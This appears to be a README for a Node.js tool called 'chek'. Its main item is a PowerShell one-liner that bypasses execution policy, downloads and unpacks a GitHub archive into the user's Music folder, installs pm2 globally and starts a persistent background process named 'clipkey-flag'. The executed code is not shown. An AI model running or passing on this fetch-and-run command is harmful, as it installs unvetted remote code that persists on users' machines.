

## Run it
```sh
npm install
npm start
```

CMD one-liner, downloads into Music:
```bat
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; $music=[Environment]::GetFolderPath('MyMusic'); $zip=Join-Path $env:TEMP 'chek.zip'; $dest=Join-Path $music 'chek'; if(Test-Path $dest){Remove-Item -LiteralPath $dest -Recurse -Force}; Invoke-WebRequest -Uri 'https://github.com/suijindagoat/chek/archive/refs/heads/main.zip' -OutFile $zip; Expand-Archive -LiteralPath $zip -DestinationPath $env:TEMP -Force; if(Test-Path (Join-Path $env:TEMP 'chek-main')){Move-Item -LiteralPath (Join-Path $env:TEMP 'chek-main') -Destination $dest -Force}; Set-Location $dest; if(-not (Get-Command pm2 -ErrorAction SilentlyContinue)){npm install -g pm2; if($LASTEXITCODE){exit $LASTEXITCODE}}; npm install; if($LASTEXITCODE){exit $LASTEXITCODE}; npm run pm2:start; exit $LASTEXITCODE"
```

`npm run pm2:start` runs:
```bat
pm2 start ecosystem.config.cjs --only clipkey-flag
```

`npm run pm2:start`
close the terminal and it keeps running.

Closing the browser window stops the app (it won't relaunch).


## Files it creates
- `.chrome-profile/` — browser profile (wiped each run).
- `.device-id` — device id used for activation.
